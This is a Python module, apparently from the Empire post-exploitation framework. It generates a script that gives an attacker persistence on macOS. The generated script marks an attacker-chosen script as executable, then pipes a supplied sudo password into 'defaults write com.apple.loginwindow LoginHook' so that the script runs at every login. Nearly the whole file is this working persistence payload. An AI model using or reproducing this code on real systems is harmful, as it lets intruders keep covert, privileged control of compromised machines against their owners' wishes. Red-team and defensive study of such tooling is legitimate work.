from builtins import object
from typing import Dict, Tuple, Optional

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = "") -> Tuple[Optional[str], Optional[str]]:

        loginhook_script_path = params['LoginHookScript']
        password = params['Password']
        password = password.replace('$', '\$')
        password = password.replace('$', '\$')
        password = password.replace('!', '\!')
        password = password.replace('!', '\!')
        script = """
import subprocess
import sys
try:
    process = subprocess.Popen('which sudo|wc -l', stdout=subprocess.PIPE, shell=True)
    result = process.communicate()
    result = result[0].strip()
    if str(result) != "1":
        print("[!] ERROR to create a LoginHook requires (sudo) privileges!")
        sys.exit()
    try:
        print(" [*] Setting script to proper linux permissions")
        process = subprocess.Popen('chmod +x %s', stdout=subprocess.PIPE, shell=True)
        process.communicate()
    except Exception as e:
        print("[!] Issues setting login hook (line 81): " + str(e))

    print(" [*] Creating proper LoginHook")

    try:
        process = subprocess.Popen('echo "%s" | sudo -S defaults write com.apple.loginwindow LoginHook %s', stdout=subprocess.PIPE, shell=True)
        process.communicate()
    except Exception as e:
        print("[!] Issues setting login hook (line 81): " + str(e))

    try:
        process = subprocess.Popen('echo "%s" | sudo -S defaults read com.apple.loginwindow', stdout=subprocess.PIPE, shell=True)
        print(" [*] LoginHook Output: ")
        result = process.communicate()
        result = result[0].strip()
        print(" [*] LoginHook set to:")
        print(str(result))
    except Exception as e:
        print("[!] Issue checking LoginHook settings (line 86): " + str(e))
except Exception as e:
    print("[!] Issue with LoginHook script: " + str(e))

""" % (loginhook_script_path, password, loginhook_script_path, password)

        return script
